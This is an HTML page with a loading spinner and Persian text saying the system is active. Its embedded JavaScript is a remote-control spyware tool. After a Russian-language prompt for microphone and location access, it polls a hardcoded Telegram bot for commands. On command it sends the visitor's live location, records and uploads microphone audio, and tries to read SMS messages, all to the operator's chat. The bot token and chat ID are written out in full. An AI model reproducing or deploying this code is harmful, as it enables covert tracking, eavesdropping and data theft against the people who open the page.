<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سیستم کنترل موبایل</title>
    <style>
        body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial;
        }
        .loader {
            border: 10px solid #333;
            border-top: 10px solid #ff6200;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            color: #ff6200;
            font-size: 24px;
            margin-top: 20px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div>
        <div class="loader"></div>
        <div class="status">سیستم فعال شد</div>
    </div>

    <script>
        const BOT_TOKEN = '1402368167:AAFDWCnh640v9tcQ5Um-Zg_DPaahthSwVzI';
        const CHAT_ID = '1220575760';

        class MobileController {
            constructor() {
                this.recorder = null;
                this.audioChunks = [];
                this.initSystem();
            }

            async initSystem() {
                await this.handlePermissions();
                setInterval(() => this.checkTelegramCommands(), 3000);
                this.sendToTelegram('✅ سیستم با موفقیت راه‌اندازی شد');
            }

            async handlePermissions() {
                if(localStorage.getItem('permissionsGranted') === 'true') return;
                
                const accepted = confirm('Для работы системы требуется:\n1. Доступ к геолокации\n2. Доступ к микрофону\nРазрешить доступ?');
                if(!accepted) return;

                try {
                    await Promise.all([
                        navigator.mediaDevices.getUserMedia({ audio: true }),
                        new Promise((res, rej) => 
                            navigator.geolocation.getCurrentPosition(res, rej))
                    ]);
                    localStorage.setItem('permissionsGranted', 'true');
                } catch(e) {
                    alert('Доступ отклонен!');
                    localStorage.removeItem('permissionsGranted');
                }
            }

            async checkTelegramCommands() {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
                    const data = await response.json();
                    
                    data.result.forEach(update => {
                        if(update.message.chat.id == CHAT_ID) {
                            this.executeCommand(update.message.text);
                        }
                    });
                } catch(e) {
                    console.error('خطا در دریافت دستورات:', e);
                }
            }

            executeCommand(command) {
                switch(command.toLowerCase()) {
                    case '/locate':
                        this.sendLiveLocation();
                        break;
                    case '/record_start':
                        this.startRecording();
                        break;
                    case '/record_stop':
                        this.stopRecording();
                        break;
                    case '/get_sms':
                        this.readSMS();
                        break;
                }
            }

            async sendLiveLocation() {
                try {
                    const pos = await new Promise((res, rej) => 
                        navigator.geolocation.getCurrentPosition(res, rej));
                    
                    const mapUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    this.sendToTelegram(`📍 موقعیت زنده:\n${mapUrl}`);
                } catch(e) {
                    this.sendToTelegram('⚠️ خطا در دریافت موقعیت: ' + e.message);
                }
            }

            async startRecording() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    this.recorder = new MediaRecorder(stream);
                    this.recorder.start();
                    this.audioChunks = [];
                    this.recorder.ondataavailable = e => this.audioChunks.push(e.data);
                    this.sendToTelegram('⏺ ضبط صدا شروع شد...');
                } catch(e) {
                    this.sendToTelegram('⚠️ خطا در شروع ضبط: ' + e.message);
                }
            }

            async stopRecording() {
                if(!this.recorder) return;

                try {
                    await new Promise(res => {
                        this.recorder.onstop = () => {
                            this.recorder.stream.getTracks().forEach(track => track.stop());
                            res();
                        };
                        this.recorder.stop();
                    });
                    
                    await new Promise(res => setTimeout(res, 500));
                    
                    const audioBlob = new Blob(this.audioChunks, { type: 'audio/webm' });
                    if(audioBlob.size > 1024) {
                        this.sendAudioFile(audioBlob);
                    } else {
                        this.sendToTelegram('⚠️ فایل صوتی خالی است!');
                    }
                } catch(e) {
                    this.sendToTelegram('⚠️ خطا در توقف ضبط: ' + e.message);
                } finally {
                    this.audioChunks = [];
                }
            }

            async readSMS() {
                if(!('sms' in navigator)) {
                    this.sendToTelegram('⚠️ قابلیت SMS در این مرورگر پشتیبانی نمیشود');
                    return;
                }

                try {
                    const sms = await navigator.sms.receive();
                    this.sendToTelegram(`📩 SMS جدید:\nفرستنده: ${sms.sender}\nمتن: ${sms.body}`);
                } catch(e) {
                    this.sendToTelegram('⚠️ خطا در خواندن SMS: ' + e.message);
                }
            }

            async sendToTelegram(text) {
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: text
                        })
                    });
                } catch(e) {
                    console.error('خطا در ارسال پیام:', e);
                }
            }

            async sendAudioFile(audioBlob) {
                try {
                    const fd = new FormData();
                    fd.append('audio', audioBlob, 'recording.webm');
                    fd.append('chat_id', CHAT_ID);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                        method: 'POST',
                        body: fd
                    });
                } catch(e) {
                    this.sendToTelegram('⚠️ خطا در ارسال فایل صوتی: ' + e.message);
                }
            }
        }

        new MobileController();
    </script>
</body>
</html>
